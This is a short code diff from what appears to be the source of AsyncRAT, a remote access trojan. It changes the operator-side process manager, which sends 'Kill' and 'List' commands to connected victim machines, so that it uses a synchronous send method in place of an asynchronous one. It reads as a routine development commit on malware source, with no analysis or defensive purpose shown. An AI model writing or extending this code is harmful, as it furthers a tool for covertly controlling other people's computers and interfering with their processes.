@@ -40,7 +40,7 @@ namespace AsyncRAT_Sharp.Forms
                         msgpack.ForcePathObject("Packet").AsString = "processManager";
                         msgpack.ForcePathObject("Option").AsString = "Kill";
                         msgpack.ForcePathObject("ID").AsString = P.SubItems[lv_id.Index].Text;
-                        ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                     });
                 }
             }
@@ -53,7 +53,7 @@ namespace AsyncRAT_Sharp.Forms
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "processManager";
                 msgpack.ForcePathObject("Option").AsString = "List";
-                ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
             });
         }
     }
